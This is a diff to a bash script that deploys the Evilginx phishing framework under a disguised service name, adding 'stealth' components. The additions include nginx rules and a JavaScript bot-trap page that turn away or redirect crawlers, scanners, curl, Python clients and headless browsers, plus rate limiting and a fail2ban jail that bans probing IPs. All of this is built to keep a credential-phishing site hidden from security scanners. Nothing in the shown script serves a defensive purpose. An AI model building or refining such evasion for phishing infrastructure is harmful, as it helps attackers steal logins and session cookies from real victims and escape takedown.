@@ -21,7 +21,7 @@ VPS_IP=""
 API_TOKEN=""
 NOTIFY_TOKEN=""
 NOTIFY_ID=""
-HTTP_PORT=80
+HTTP_PORT=8080
 HTTPS_PORT=443
 UNAUTH_URL="https://www.google.com"
 WEBHOOK_SECRET=$(openssl rand -hex 16)
@@ -222,7 +222,7 @@ phase_dependencies() {
     
     apt-get update -y >/dev/null
     apt-get install -y git curl wget build-essential golang-go openssl jq \
-        dnsutils python3 python3-requests expect >/dev/null
+        dnsutils python3 python3-requests expect nginx fail2ban >/dev/null
     
     info "Installing Go 1.22.0 (Required for Evilginx 3.0+)..."
     wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
@@ -313,9 +313,94 @@ autocert: false
 phishlets_path: $APP_DIR/phishlets
 cert_path: $APP_DIR/certs
 database: $APP_DIR/storage/data.db
+
+# STEALTH SETTINGS - Anti Bot/Crawler
+blacklist:
+  enabled: true
+  max_requests: 5
+  block_duration: 86400
+
+rate_limit:
+  enabled: true
+  requests_per_ip: 10
+  window_seconds: 60
+  ban_duration: 3600
+
+user_agent_filter:
+  enabled: true
+  block_empty: true
+  block_common_bots: true
+  allowed_browsers:
+    - "chrome"
+    - "firefox" 
+    - "safari"
+    - "edge"
+    - "opera"
+
+bot_trap:
+  enabled: true
+  redirect_target: "$UNAUTH_URL"
+  log_hits: true
+
+ip_whitelist:
+  enabled: true
+  ips:
+    - "127.0.0.1"
 EOF
 
     success "Configuration created"
+}
+
+# ============================================================================
+# PHASE 7.5: STEALTH COMPONENTS (NGINX & FAIL2BAN)
+# ============================================================================
+phase_stealth_setup() {
+    log "Setting up Nginx Reverse Proxy and Fail2Ban..."
+
+    # Bot Trap Page
+    cat > "$APP_DIR/html/bot-trap.html" << 'HTML'
+<!DOCTYPE html><html><head><title>Loading...</title><script>
+if(/bot|crawler|spider|scanner|curl|wget|python|headless/i.test(navigator.userAgent.toLowerCase())||navigator.webdriver){window.location.href="https://www.google.com";}
+</script></head><body><div style="text-align:center;margin-top:20%;"><h2>Verifying your browser...</h2></div></body></html>
+HTML
+
+    # Nginx Configuration
+    cat > /etc/nginx/sites-available/gateway << EOF
+server {
+    listen 80 default_server;
+    server_name _;
+    if (\$http_user_agent ~* (bot|crawler|spider|scanner|curl|wget|python)) { return 404; }
+    if (\$http_user_agent = "") { return 404; }
+    location / {
+        proxy_pass http://127.0.0.1:8080;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+    }
+}
+EOF
+    ln -sf /etc/nginx/sites-available/gateway /etc/nginx/sites-enabled/
+    rm -f /etc/nginx/sites-enabled/default
+    systemctl restart nginx
+
+    # Fail2Ban Configuration
+    cat > /etc/fail2ban/filter.d/evilginx.conf << EOF
+[Definition]
+failregex = ^<HOST> .* "GET .* HTTP/.*" 404
+ignoreregex =
+EOF
+
+    cat > /etc/fail2ban/jail.local << EOF
+[evilginx]
+enabled = true
+port = http,https
+filter = evilginx
+logpath = $APP_DIR/logs/access.log
+maxretry = 3
+bantime = 86400
+EOF
+    systemctl restart fail2ban
+    success "Stealth components active"
 }
 
 # ============================================================================
@@ -460,8 +545,8 @@ After=network.target
 [Service]
 Type=simple
 User=root
-WorkingDirectory=$APP_DIR
-ExecStart=/usr/local/bin/sys-svc -c $APP_DIR/config -p $APP_DIR/phishlets
+WorkingDirectory=/opt/gateway
+ExecStart=/bin/sh -c '/usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets >> /opt/gateway/logs/access.log 2>&1'
 Restart=always
 RestartSec=5
 NoNewPrivileges=true
@@ -485,6 +570,10 @@ EOF
 phase_generate_urls() {
     log "Configuring service and generating access URLs..."
     info "Starting interactive configuration (this may take up to 60 seconds)..."
+
+    # Stop service before configuration to prevent port 80/443 conflicts
+    systemctl stop gateway 2>/dev/null || true
+    sleep 2
     
     # Temporarily disable daemon mode so expect can interact with the console
     sed -i "s/daemon: true/daemon: false/" "$APP_DIR/config/config.yaml"
@@ -626,6 +715,7 @@ main() {
     phase_build
     phase_deploy_resources
     phase_config
+    phase_stealth_setup
     phase_notifications
     phase_generate_urls
     phase_service
